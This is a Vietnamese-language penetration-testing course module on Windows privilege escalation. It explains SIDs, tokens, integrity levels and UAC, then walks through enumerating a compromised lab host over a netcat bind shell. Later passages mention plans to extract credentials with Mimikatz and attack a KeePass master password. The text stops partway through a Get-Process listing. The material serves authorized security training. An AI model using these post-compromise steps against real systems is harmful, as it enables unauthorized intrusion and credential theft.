# Windows Privilege Escalation

# Windows Privilege Escalation

---

Trong Learning Module này, chúng ta sẽ bao gồm các Learning Unit sau:

- Enumerating Windows
- Leveraging Windows Services
- Abusing other Windows components

Trong một penetration test, chúng ta thường giành được foothold ban đầu trên một hệ thống Windows với tư cách là một user không có đặc quyền. Tuy nhiên, thông thường chúng ta cần quyền quản trị để tìm kiếm thông tin nhạy cảm trong các thư mục home của người dùng khác, kiểm tra các file cấu hình trên hệ thống, hoặc trích xuất password hash bằng Mimikatz. Quá trình nâng quyền và mức độ truy cập của chúng ta từ không đặc quyền lên có đặc quyền được gọi là Privilege Escalation.

Mặc dù Module này tập trung vào Windows, Module tiếp theo sẽ khám phá các kỹ thuật privilege escalation trên các hệ thống Linux. Sau khi hoàn thành cả hai Module, chúng ta không chỉ hiểu được cách mà mô hình bảo mật và bề mặt tấn công của hai hệ điều hành này khác nhau, mà còn biết cách chúng ta có thể khai thác các vector privilege escalation trên từng hệ điều hành.

Trong Module này, chúng ta sẽ bắt đầu với phần giới thiệu về các đặc quyền của Windows và các cơ chế kiểm soát truy cập. Sau đó, chúng ta sẽ đề cập đến cách thiết lập situational awareness trên hệ thống mục tiêu bằng cách thu thập thông tin. Dựa trên các thông tin này, chúng ta sẽ thực hiện nhiều cuộc tấn công privilege escalation khác nhau. Đầu tiên, chúng ta sẽ tìm kiếm trên hệ thống các thông tin nhạy cảm bị người dùng và OS để lại. Tiếp theo, chúng ta sẽ học cách lạm dụng các Windows services để cố gắng thực hiện các cuộc tấn công privilege escalation. Cuối cùng, chúng ta sẽ xem xét các thành phần khác của Windows cho phép chúng ta nâng quyền thông qua Scheduled Tasks. Cuối cùng, chúng ta sẽ điều tra việc sử dụng các exploit.

---

# 1. Enumerating Windows

---

Learning Unit này bao gồm các Learning Objective sau:

- Hiểu các đặc quyền của Windows và các cơ chế kiểm soát truy cập
- Thu thập situational awareness
- Tìm kiếm thông tin nhạy cảm trên các hệ thống Windows
- Tìm thông tin nhạy cảm được tạo ra bởi PowerShell
- Làm quen với các công cụ enumeration tự động

Mỗi target đều có thể được xem là duy nhất do sự khác biệt về phiên bản OS, mức vá (patch level), cấu hình hệ thống, v.v. Do đó, điều quan trọng là chúng ta phải hiểu cách thu thập và tận dụng thông tin về hệ thống mục tiêu để đạt được privilege escalation. Để nắm bắt đầy đủ các attack vector trong Module này, trước hết chúng ta cần làm quen với cấu trúc đặc quyền của Windows và các cơ chế kiểm soát truy cập.

Mặc dù việc sử dụng các technical attack vector để đạt được privilege escalation là rất phổ biến, nhưng trong nhiều trường hợp, chỉ cần xem xét lại các thông tin mà người dùng và hệ thống để lại cũng đã đủ. Một vài ví dụ là khi người dùng lưu password trong một file văn bản hoặc khi Windows ghi lại việc nhập password trong PowerShell. Đối với attacker, đây có thể là một mỏ vàng dẫn đến các mức đặc quyền cao hơn.

Trong Learning Unit này, chúng ta sẽ bắt đầu bằng việc thảo luận cách các đặc quyền của Windows và các cơ chế kiểm soát truy cập hoạt động. Sau đó, chúng ta sẽ khám phá các phương pháp để thiết lập situational awareness trên hệ thống. Những phương pháp này cung cấp các thông tin thiết yếu về hệ thống mục tiêu như các user hiện có, các kết nối mạng đang hoạt động và các ứng dụng đang chạy. Tiếp theo, chúng ta sẽ xem xét nhiều khu vực khác nhau trong Windows nơi chúng ta có thể tìm kiếm thông tin nhạy cảm. Cuối cùng, chúng ta sẽ rà soát các công cụ tự động hóa.

---

## 1.1. Hiểu về các đặc quyền của Windows và các cơ chế kiểm soát truy cập

---

Các đặc quyền (privileges) trên hệ điều hành Windows đề cập đến các quyền của một account cụ thể để thực hiện các thao tác cục bộ liên quan đến hệ thống (ví dụ: chỉnh sửa filesystem hoặc thêm user). Để cho phép hoặc từ chối các thao tác này, Windows cần các cơ chế kiểm soát nhằm xác định nguồn gốc của thao tác và xác định xem các đặc quyền hiện có có đủ để thực hiện thao tác đó hay không.

Trong phần này, chúng ta sẽ đề cập đến bốn khái niệm và cơ chế khác nhau: Security Identifier (SID), access token, Mandatory Integrity Control, và User Account Control.

Windows sử dụng SID để định danh các entity. SID là một giá trị duy nhất được gán cho mỗi entity, hay principal, có thể được Windows xác thực, chẳng hạn như user và group. SID cho các local account và group được tạo bởi Local Security Authority (LSA), còn đối với domain user và domain group thì được tạo trên Domain Controller (DC). SID không thể bị thay đổi và được sinh ra tại thời điểm user hoặc group được tạo.

Windows chỉ sử dụng SID, không sử dụng username, để định danh principal trong việc quản lý kiểm soát truy cập.

Chuỗi SID bao gồm nhiều phần khác nhau, được phân tách bằng dấu “-”, và được biểu diễn bởi các placeholder “S”, “R”, “X”, và “Y” trong listing sau. Biểu diễn này là cấu trúc nền tảng của một SID.

```
S-R-X-Y
```

                                                                    *Listing 1 – Biểu diễn SID*

Phần đầu tiên là ký tự “S”, cho biết chuỗi này là một SID.

“R” đại diện cho revision và luôn được đặt là “1”, vì cấu trúc tổng thể của SID hiện vẫn ở phiên bản ban đầu.

“X” xác định identifier authority. Đây là authority phát hành SID. Ví dụ, “5” là giá trị phổ biến nhất cho identifier authority. Nó chỉ định NT Authority và được sử dụng cho local user hoặc domain user và group.

“Y” biểu thị các sub authority của identifier authority. Mỗi SID bao gồm một hoặc nhiều sub authority. Phần này bao gồm domain identifier và relative identifier (RID). Domain identifier là SID của domain đối với domain user, SID của máy local đối với local user, và “32” đối với các built-in principal. RID xác định các principal cụ thể như user hoặc group.

Listing sau đây cho thấy một ví dụ SID của một local user trên hệ thống Windows:

```
S-1-5-21-1336799502-1441772794-948155058-1001
```

                                                                   *Listing 2 – Biểu diễn SID*

Listing 2 cho thấy RID là 1001. Vì RID bắt đầu từ 1000 đối với gần như tất cả các principal, điều này ngụ ý rằng đây là local user thứ hai được tạo trên hệ thống.

Có những SID có RID nhỏ hơn 1000, được gọi là well-known SIDs. Các SID này định danh các group và user chung, built-in thay vì các group và user cụ thể. Listing sau đây chứa một số well-known SID hữu ích trong bối cảnh privilege escalation.

```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

                                     *Listing 3 – Danh sách well-known SID trên máy local*

Mặc dù trong Module này chúng ta sẽ không trực tiếp làm việc với SID, việc biết cách Windows định danh principal là cần thiết để hiểu access token. Ngoài ra, điều này cũng rất quan trọng trong các Module Active Directory sắp tới.

Bây giờ khi chúng ta đã biết cách Windows định danh các principal trên một hệ thống, hãy thảo luận cách Windows quyết định cho phép hay từ chối các thao tác. Khi một user được xác thực, Windows tạo ra một access token và gán nó cho user đó. Bản thân token chứa nhiều thông tin khác nhau, về cơ bản mô tả security context của một user nhất định. Security context là một tập hợp các quy tắc hoặc thuộc tính đang có hiệu lực tại thời điểm đó.

Security context của một token bao gồm SID của user, SID của các group mà user là thành viên, các đặc quyền của user và group, cùng các thông tin bổ sung mô tả phạm vi của token.

Khi một user khởi chạy một process hoặc thread, một token sẽ được gán cho các object này. Token này, được gọi là primary token, chỉ định các quyền mà process hoặc thread có khi tương tác với các object khác và là một bản sao của access token của user.

Một thread cũng có thể được gán một impersonation token. Impersonation token được sử dụng để cung cấp một security context khác với process sở hữu thread đó. Điều này có nghĩa là thread sẽ tương tác với các object thay mặt cho impersonation token thay vì primary token của process.

Ngoài SID và token, Windows còn triển khai một cơ chế được gọi là Mandatory Integrity Control. Cơ chế này sử dụng integrity level để kiểm soát quyền truy cập vào các securable object. Chúng ta có thể hình dung các level này như là các phân cấp về mức độ tin cậy mà Windows dành cho một ứng dụng đang chạy hoặc một securable object.

Khi process được khởi chạy hoặc object được tạo, chúng sẽ nhận integrity level của principal thực hiện thao tác đó. Một ngoại lệ là nếu một executable file có integrity level thấp, thì integrity level của process cũng sẽ thấp. Một principal có integrity level thấp hơn không thể ghi vào một object có level cao hơn, ngay cả khi các permission thông thường cho phép điều đó.

Từ Windows Vista trở đi, các process chạy với năm integrity level:

- **System**: SYSTEM (kernel, …)
- **High**: Elevated users
- **Medium**: Standard users
- **Low**: Quyền rất hạn chế, thường được sử dụng trong các process sandboxed[^privesc_win_sandbox] hoặc cho các thư mục lưu trữ dữ liệu tạm
- **Untrusted**: Integrity level thấp nhất với quyền truy cập cực kỳ hạn chế cho các process hoặc object có mức rủi ro tiềm ẩn cao nhất

                                                           *Listing 4 – Các Integrity Level*

Chúng ta có thể hiển thị integrity level của process bằng Process Explorer, của user hiện tại bằng lệnh `whoami /groups`, và của file bằng `icacls`.

Ví dụ, hình sau cho thấy hai process PowerShell trên một hệ thống Windows trong Process Explorer. Một process được khởi chạy với tư cách user thông thường và process còn lại với tư cách user quản trị.

![image.png](image.png)

                                               *Figure 1: Different Integrity Levels of PowerShell*

Các process PowerShell có integrity level là High và Medium. Đối chiếu với Listing 4, chúng ta có thể suy ra rằng process có integrity level High được khởi chạy bởi user quản trị, còn process có integrity level Medium được khởi chạy bởi user thông thường.

Cuối cùng, một công nghệ bảo mật khác của Windows mà chúng ta cần xem xét là User Account Control (UAC). UAC là một tính năng bảo mật của Windows nhằm bảo vệ hệ điều hành bằng cách chạy hầu hết các ứng dụng và tác vụ với quyền standard user, ngay cả khi user khởi chạy chúng là Administrator. Để làm được điều này, một administrative user sẽ nhận được hai access token sau khi logon thành công. Token thứ nhất là standard user token (hoặc filtered admin token), được sử dụng để thực hiện tất cả các thao tác không có đặc quyền. Token thứ hai là administrator token thông thường, được sử dụng khi user muốn thực hiện một thao tác có đặc quyền. Để sử dụng administrator token, cần phải xác nhận một UAC consent prompt.

Như vậy là chúng ta đã kết thúc phần giới thiệu ngắn gọn về các đặc quyền của Windows và các cơ chế kiểm soát truy cập. Lúc này, chúng ta nên có hiểu biết cơ bản về SID, access token, integrity level và UAC. Windows còn cung cấp nhiều cơ chế khác để kiểm soát quyền truy cập vào các securable object. Chúng ta sẽ thảo luận và minh họa thêm nhiều cơ chế khác trong Module này.

---

## 1.2. Situational Awareness

---

Bây giờ khi chúng ta đã có hiểu biết cơ bản về các đặc quyền của Windows, chúng ta sẽ đề cập đến nhiều phương pháp khác nhau để thu thập situational awareness trên một hệ thống. Giả sử rằng chúng ta đã sử dụng một client-side attack hoặc khai thác một vulnerability để truy cập vào một hệ thống Windows với tư cách là một user không có đặc quyền. Trước khi cố gắng nâng quyền, chúng ta phải thu thập thông tin về hệ thống mà chúng ta đang đứng trên đó.

Đây là một bước cực kỳ quan trọng để hiểu rõ hơn bản chất của máy đã bị compromise và phát hiện các vector khả dĩ cho privilege escalation. Tuy nhiên, bước này thường bị bỏ qua hoặc thực hiện rất sơ sài bởi các penetration tester thiếu kinh nghiệm, vì việc sàng lọc và diễn giải một lượng lớn thông tin không “hấp dẫn” bằng việc tấn công trực tiếp các service hoặc máy khác. Các penetration tester có kinh nghiệm hiểu rằng bằng cách thu thập càng nhiều thông tin càng tốt, họ có thể thu được những thông tin giá trị về hệ thống mục tiêu, từ đó tạo ra nhiều vector khả thi để nâng quyền.

Có một số mảnh thông tin then chốt mà chúng ta luôn nên thu thập:

- Username và hostname
- Group membership của user hiện tại
- Các user và group hiện có
- Hệ điều hành, phiên bản và kiến trúc
- Thông tin mạng
- Các ứng dụng đã được cài đặt
- Các process đang chạy

                                 *Listing 5 – Thông tin cần thu thập để có situational awareness*

Sau khi thực hiện các bước enumeration để thu thập những thông tin này, chúng ta sẽ có một sự hiểu biết vững chắc về hệ thống mục tiêu.

Hãy bắt đầu thu thập thông tin trên hệ thống CLIENTWK220. Trong ví dụ này, chúng ta giả định rằng trước đó đã khởi chạy một bind shell trên cổng 4444 thông qua một client-side attack.

Nếu kết nối đến bind shell trong phần này hoặc các phần tiếp theo bị ngắt, có thể mất tới 1 phút để nó có thể truy cập lại được.

Bây giờ, chúng ta sẽ minh họa cách thu thập các thông tin trong Listing 5. Để làm điều này, chúng ta sẽ kết nối đến hệ thống mục tiêu bằng netcat và nhập lệnh `whoami` để thu thập các thông tin đầu tiên: username và hostname.

```
kali@kali:~$ nc 192.168.50.220 4444
Microsoft Windows [Version 10.0.22000.318]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dave>whoami
whoami
clientwk220\dave

C:\Users\dave>
```

                              *Listing 6 – Kết nối tới bind shell và thu thập username, hostname*

Output của Listing 6 cho thấy chúng ta có khả năng thực thi lệnh với tư cách user dave. Ngoài ra, output còn chứa hostname của hệ thống là clientwk220. Hostname này ngụ ý rằng bind shell của chúng ta đang chạy trên một client system thay vì một server.

Hostname thường có thể được sử dụng để suy đoán mục đích và loại máy. Ví dụ, WEB01 cho web server hoặc MSSQL01 cho một MSSQL server.

Tiếp theo, chúng ta muốn kiểm tra xem dave thuộc những group nào. Để hiển thị tất cả các group mà user hiện tại là thành viên, chúng ta có thể sử dụng `whoami /groups`.

```
C:\Users\dave> whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID                                            Attributes                                        
====================================== ================ ============================================== ==================================================
Everyone                             Well-known group S-1-1-0                            Mandatory group, Enabled by default, Enabled group
CLIENTWK220\helpdesk                 Alias            S-1-5-21-2309961351-4093026482-2223492918-1008 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users         Alias            S-1-5-32-555                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                   Well-known group S-1-5-3                            Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1                            Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                           Mandatory group, Enabled by default, Enabled group
... 
```

                                                   *Listing 7 – Group membership của user dave*

Output cho thấy dave là thành viên của group helpdesk. Nhân viên helpdesk thường có nhiều quyền và quyền truy cập hơn so với standard user.

Ngoài ra, user này còn là thành viên của BUILTIN\Remote Desktop Users. Việc là thành viên của group này cho phép kết nối tới hệ thống thông qua RDP.

Các group còn lại mà dave là thành viên đều là các group tiêu chuẩn đối với user không có đặc quyền, chẳng hạn như Everyone và BUILTIN\Users.

Mảnh thông tin tiếp theo mà chúng ta quan tâm là các user và group khác trên hệ thống. Chúng ta có thể sử dụng lệnh `net user` hoặc Cmdlet `Get-LocalUser` để lấy danh sách tất cả các local user. Chúng ta sẽ sử dụng cách thứ hai bằng cách khởi chạy PowerShell và chạy `Get-LocalUser`.

```
C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> Get-LocalUser
Get-LocalUser

Name               Enabled Description                                                                              
----               ------- -----------                                                                              
Administrator      False   Built-in account for administering the computer/domain
BackupAdmin        True
dave               True    dave 
daveadmin          True 
DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
offsec             True
steve              True
... 
```

                                         *Listing 8 – Hiển thị local user trên CLIENTWK220*

Output cho thấy một số điểm đáng chú ý có thể giúp chúng ta có cái nhìn tổng quan về hệ thống.

Đầu tiên, built-in Administrator account đang bị disable. Tiếp theo, có hai user thông thường được cho là steve và dave. Ngoài ra, chúng ta còn xác định được hai user khác là daveadmin và BackupAdmin. Cả hai username đều chứa chuỗi “admin”, ngụ ý rằng đây có thể là các user có quyền quản trị, khiến chúng trở thành các target rất giá trị.

Chúng ta cũng có thể giả định rằng daveadmin là account có đặc quyền của dave. Các administrator thường có cả một account không đặc quyền và một account có đặc quyền. Họ sử dụng account không đặc quyền cho các công việc hằng ngày và account có đặc quyền cho các tác vụ quản trị. Vì lý do bảo mật, họ không sử dụng account có đặc quyền để thực hiện các tác vụ tiềm ẩn rủi ro như duyệt internet.

Trước khi đưa ra thêm các giả định, hãy enumerate các group hiện có trên CLIENTWK220. Chúng ta có thể lựa chọn giữa lệnh `net localgroup` hoặc `Get-LocalGroup` trong PowerShell.

```
PS C:\Users\dave> Get-LocalGroup
Get-LocalGroup

Name                                Description                                                                      
----                                -----------                                                                     
adminteam                  Members of this group are admins to all workstations on the second floor
BackupUsers 
helpdesk
...
Administrators                      Administrators have complete and unrestricted access to the computer/domain
...
Remote Desktop Users                Members in this group are granted the right to logon remotely
...  
```

                                         *Listing 9 – Hiển thị local group trên CLIENTWK220*

Listing 9 hiển thị các group không tiêu chuẩn là adminteam, BackupUsers và helpdesk.

Group adminteam có thể là một đối tượng đáng quan tâm vì nó chứa chuỗi “admin” và có mô tả tùy chỉnh, cho biết các thành viên là administrator của tất cả các workstation ở tầng hai. Tuy nhiên, hiện tại chúng ta chưa có thêm thông tin về việc có những tầng nào hoặc các phòng ban nằm ở đâu.

Một phát hiện đáng chú ý khác là group BackupUsers, tương tự như user BackupAdmin trước đó. Các giải pháp backup thường có các quyền rất rộng để thực hiện thao tác trên filesystem, khiến cả hai trở thành các target tiềm năng có giá trị.

Ngoài các group không tiêu chuẩn, còn có nhiều group built-in mà chúng ta nên phân tích, chẳng hạn như Administrators, Backup Operators, Remote Desktop Users và Remote Management Users.

Các thành viên của Backup Operators có thể backup và restore tất cả các file trên một máy tính, kể cả những file mà họ không có permission. Chúng ta không được nhầm lẫn group này với các group không tiêu chuẩn như BackupUsers trong ví dụ này.

Các thành viên của Remote Desktop Users có thể truy cập hệ thống thông qua RDP, trong khi các thành viên của Remote Management Users có thể truy cập thông qua WinRM.

Trong ví dụ này, chúng ta sẽ xem xét các thành viên của adminteam và Administrators. Chúng ta có thể làm điều này với `Get-LocalGroupMember`, truyền tên group làm tham số.

```
PS C:\Users\dave> Get-LocalGroupMember adminteam
Get-LocalGroupMember adminteam

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\daveadmin     Local 

PS C:\Users\dave> Get-LocalGroupMember Administrators
Get-LocalGroupMember Administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local          
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\backupadmin   Local  
User        CLIENTWK220\offsec        Local
```

                                      *Listing 10 – Hiển thị thành viên của group adminteam*

Listing 10 cho thấy chỉ có daveadmin là thành viên của adminteam. Tuy nhiên, adminteam không nằm trong local Administrators group. Chúng ta chỉ biết rằng các thành viên của group này là administrator đối với các workstation ở tầng hai. Thông tin hiện tại chưa thể hành động trực tiếp, nhưng nó có thể trở nên hữu ích khi chúng ta đi sâu hơn vào mạng và xác định được những hệ thống nào nằm ở tầng hai.

Output cũng cho thấy rằng ngoài local Administrator account đang bị disable, các user daveadmin và BackupAdmin là thành viên của local Administrators group. Do đó, chúng ta đã xác định được hai target cực kỳ giá trị.

Mặc dù việc biết user nào có đặc quyền là rất quan trọng, việc hiểu user nào có thể sử dụng RDP cũng rất thiết yếu. Việc thu được credential của một trong các user này có thể giúp chúng ta có quyền truy cập GUI, điều này thường cải thiện đáng kể khả năng tương tác với hệ thống.

Chúng ta đã thu thập được khá nhiều thông tin về user và group trên hệ thống mục tiêu. Hãy tóm tắt ngắn gọn những gì chúng ta biết cho đến thời điểm này.

Bind shell của chúng ta chạy với tư cách user dave trên một máy có hostname CLIENTWK220. User này thuộc group helpdesk. Ngoài ra, còn có một user khác tên là daveadmin, rất có thể là account có đặc quyền của dave, trong khi dave được dùng cho công việc hằng ngày. User daveadmin cũng thuộc group adminteam, với mô tả cho thấy group này có quyền quản trị trên tất cả các workstation ở tầng hai. Bên cạnh đó, daveadmin và BackupAdmin là local Administrator trên CLIENTWK220.

Tiếp theo, chúng ta sẽ thu thập thông tin về chính máy mục tiêu, cấu hình của nó và các ứng dụng đang chạy trên đó.

Theo danh sách trong Listing 5, trước tiên hãy kiểm tra hệ điều hành, phiên bản và kiến trúc. Chúng ta có thể sử dụng `systeminfo` để thu thập thông tin này.

```
PS C:\Users\dave> systeminfo
systeminfo

Host Name:                 CLIENTWK220
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22621 N/A Build 22621
...
System Type:               x64-based PC
...
```

                                  *Listing 11 – Thông tin về hệ điều hành và kiến trúc*

Output của Listing 11 cho thấy bind shell của chúng ta đang chạy trên hệ thống Windows 11 Pro. Để xác định chính xác phiên bản, chúng ta có thể sử dụng build number và đối chiếu với các phiên bản hiện có của hệ điều hành đã xác định. Trong trường hợp này, build 22621 tương ứng với Windows 11 phiên bản 22H2.

Ngoài ra, output còn cho biết rằng bind shell của chúng ta đang chạy trên một hệ thống 64-bit. Thông tin này trở nên quan trọng khi chúng ta muốn chạy các file binary trên hệ thống, vì chúng ta không thể chạy ứng dụng 64-bit trên hệ thống 32-bit.

Tiếp theo, hãy đi xuống danh sách và xem xét thông tin mạng mà chúng ta có thể thu thập với tư cách user dave. Mục tiêu của bước này là xác định tất cả các network interface, route và các kết nối mạng đang hoạt động. Dựa trên những thông tin này, chúng ta có thể phát hiện các service mới hoặc thậm chí quyền truy cập tới các network khác. Những thông tin này có thể không trực tiếp dẫn đến privilege escalation, nhưng chúng rất quan trọng để hiểu mục đích của máy và để tìm các vector sang các hệ thống và network khác.

*Việc giành được quyền truy cập có đặc quyền trên mọi máy trong một penetration test hiếm khi là một mục tiêu hữu ích hoặc thực tế. Mặc dù hầu hết các máy trong challenge lab của khóa học này đều có thể root, chúng ta sẽ gặp rất nhiều máy không rootable trong các bài đánh giá thực tế. Do đó, mục tiêu của một penetration tester có kỹ năng không phải là mù quáng cố gắng privilege escalation trên mọi máy bằng mọi giá, mà là xác định những máy mà việc có quyền truy cập đặc quyền sẽ dẫn đến việc compromise sâu hơn hạ tầng của khách hàng.*

Để liệt kê tất cả các network interface, chúng ta có thể sử dụng `ipconfig`⁸ với tham số `/all`.

```
PS C:\Users\dave> ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : clientwk220
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-8A-80-16
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::cc7a:964e:1f98:babb%6(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.50.220(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254
   DHCPv6 IAID . . . . . . . . . . . : 234901590
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-3B-F7-25-00-50-56-8A-80-16
   DNS Servers . . . . . . . . . . . : 8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

                                                          *Listing 12 – Thông tin cấu hình mạng*

Output cho thấy một số thông tin thú vị. Ví dụ, hệ thống không được cấu hình để nhận địa chỉ IP qua DHCP, mà được thiết lập thủ công. Ngoài ra, nó còn chứa DNS server, gateway, subnet mask và MAC address. Những thông tin này sẽ hữu ích khi chúng ta cố gắng di chuyển sang các hệ thống hoặc network khác.

Để hiển thị routing table, chứa tất cả các route của hệ thống, chúng ta có thể sử dụng `route print`. Output của lệnh này hữu ích để xác định các vector tấn công khả dĩ sang các hệ thống hoặc network khác.

```
PS C:\Users\dave> route print
route print
===========================================================================
Interface List
  4...00 50 56 95 01 6a ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0   192.168.50.254   192.168.50.220    271
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     192.168.50.0    255.255.255.0         On-link    192.168.50.220    271
   192.168.50.220  255.255.255.255         On-link    192.168.50.220    271
   192.168.50.255  255.255.255.255         On-link    192.168.50.220    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link    192.168.50.220    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link    192.168.50.220    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0   192.168.50.254  Default 
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  4    271 fe80::/64                On-link
  4    271 fe80::1b30:4f11:8789:866a/128
                                    On-link
  1    331 ff00::/8                 On-link
  4    271 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None
```

                                               *Listing 13 – Routing table trên CLIENTWK220*

Listing 13 cho thấy không có route nào tới các network chưa biết trước đó. Tuy nhiên, chúng ta luôn phải kiểm tra routing table trên hệ thống mục tiêu để đảm bảo không bỏ sót bất kỳ thông tin nào.

Để liệt kê tất cả các kết nối mạng đang hoạt động, chúng ta có thể sử dụng `netstat` với tham số `-a` để hiển thị tất cả các kết nối TCP đang hoạt động cũng như các cổng TCP và UDP, `-n` để tắt name resolution, và `-o` để hiển thị process ID cho mỗi kết nối.

```
PS C:\Users\dave> netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       3340
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1016
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       3340
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       3508
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1148
  TCP    192.168.50.220:139     0.0.0.0:0              LISTENING       4
  TCP    192.168.50.220:3389    192.168.48.3:33770     ESTABLISHED     1148
  TCP    192.168.50.220:4444    192.168.48.3:58386     ESTABLISHED     2064
...
```

                       *Listing 14 – Các kết nối mạng đang hoạt động trên CLIENTWK220*

Output của Listing 14 cho thấy các cổng 80 và 443 đang lắng nghe, thường chỉ ra rằng một web server đang chạy trên hệ thống. Ngoài ra, cổng 3306 đang mở cho thấy khả năng cao là một MySQL server đang chạy.

Output cũng hiển thị kết nối Netcat của chúng ta trên cổng 4444 cũng như một kết nối RDP từ 192.168.48.3 trên cổng 3389. Điều này có nghĩa là chúng ta không phải là user duy nhất hiện đang kết nối vào hệ thống. Khi chúng ta nâng được đặc quyền, chúng ta có thể sử dụng Mimikatz và cố gắng trích xuất credential của user đó.

Tiếp theo, chúng ta sẽ kiểm tra tất cả các ứng dụng đã được cài đặt. Chúng ta có thể truy vấn hai registry key để liệt kê cả các ứng dụng 32-bit và 64-bit trong Windows Registry bằng Cmdlet `Get-ItemProperty`. Chúng ta pipe output sang `select` với tham số `displayname` để chỉ hiển thị tên ứng dụng. Chúng ta bắt đầu với các ứng dụng 32-bit, sau đó hiển thị các ứng dụng 64-bit.

```
PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 

displayname                                                       
-----------                                                       
                                                                  
FileZilla 3.63.1                                                  
KeePass Password Safe 2.51.1                                   
Microsoft Edge                                                    
Microsoft Edge Update                                             
Microsoft Edge WebView2 Runtime                                   
                                                                  
Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913    
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913       
Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913

PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

DisplayName                                                   
-----------                                                   
7-Zip 21.07 (x64)                                             
                                                              
                                                              
XAMPP                                                         
VMware Tools                                                  
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913
Microsoft Update Health Tools                                 
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913   
Update for Windows 10 for x64-based Systems (KB5001716) 
```

                                     *Listing 15 – Các ứng dụng đã cài đặt trên CLIENTWK220*

Listing 15 cho thấy ngoài các ứng dụng Windows tiêu chuẩn, hệ thống còn cài đặt FTP client FileZilla, password manager KeePass, 7-Zip, và XAMPP.

Như đã thảo luận trong Module “Locating Public Exploits”, chúng ta có thể tìm kiếm các public exploit cho các ứng dụng đã xác định sau khi hoàn tất quá trình situational awareness. Chúng ta cũng có thể tận dụng các password attack để lấy master password của password manager nhằm có khả năng thu được các password khác, từ đó cho phép chúng ta đăng nhập với tư cách user có đặc quyền.

Tuy nhiên, danh sách ứng dụng trong Listing 15 có thể chưa đầy đủ. Ví dụ, điều này có thể xảy ra do quá trình cài đặt không hoàn chỉnh hoặc bị lỗi. Do đó, chúng ta luôn nên kiểm tra các thư mục Program Files 32-bit và 64-bit nằm trong C:. Ngoài ra, chúng ta cũng nên xem xét nội dung của thư mục Downloads của user để tìm thêm các chương trình tiềm năng.

Trong khi việc tạo danh sách các ứng dụng đã cài đặt trên hệ thống mục tiêu là quan trọng, thì việc xác định ứng dụng nào hiện đang chạy cũng quan trọng không kém. Để làm điều này, chúng ta sẽ xem xét các process đang chạy của hệ thống với `Get-Process`.

```
PS C:\Users\dave> Get-Process
Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
